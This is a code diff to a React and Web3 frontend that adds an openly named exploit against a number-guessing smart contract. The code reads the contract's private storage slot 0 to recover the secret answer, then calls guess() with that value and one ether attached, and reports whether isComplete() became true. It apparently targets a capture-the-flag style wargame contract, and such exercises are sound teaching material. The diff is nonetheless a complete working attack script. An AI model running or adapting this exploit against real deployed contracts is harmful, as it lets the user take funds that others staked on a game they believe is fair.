@@ -2,10 +2,12 @@ import React, { useEffect, useState } from 'react';
 import Web3 from 'web3';
 
 function App() {
+  const contractABI = [{"constant":false,"inputs":[{"name":"n","type":"uint8"}],"name":"guess","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":true,"stateMutability":"payable","type":"constructor"}];
   const [account, setAccount] = useState("");
   const [chainId, setChainId] = useState("");
   const [text, setText] = useState("");
   const [exploitedValue, setExploitedValue] = useState("");
+  const [exploited, setExploited] = useState("");
 
   useEffect(async () => {
     let provider = window.ethereum;
@@ -21,8 +23,17 @@ function App() {
   const exploitContract = async () => {
     let provider = window.ethereum;
     let web3 = new Web3(provider);
-    await web3.eth.getStorageAt(text, 0).then(value => {
+    await web3.eth.getStorageAt(text, 0).then(async value => {
       setExploitedValue(web3.utils.hexToNumberString(value));
+      var contract = await new web3.eth.Contract(contractABI, text);
+      await contract.methods.guess(web3.utils.hexToNumber(value)).send({from: account, value: 1000000000000000000}).then(async () => {
+        const worked = await contract.methods.isComplete().call({from: account});
+        if (worked === true) {
+          setExploited("Worked.");
+        } else {
+          setExploited("Did not work.")
+        }
+      })
     });
   }
 
@@ -48,6 +59,11 @@ function App() {
       </center>
       <center>
         {exploitedValue}
+      </center>
+      <br>
+      </br>
+      <center>
+        {exploited}
       </center>
     </div>
   );
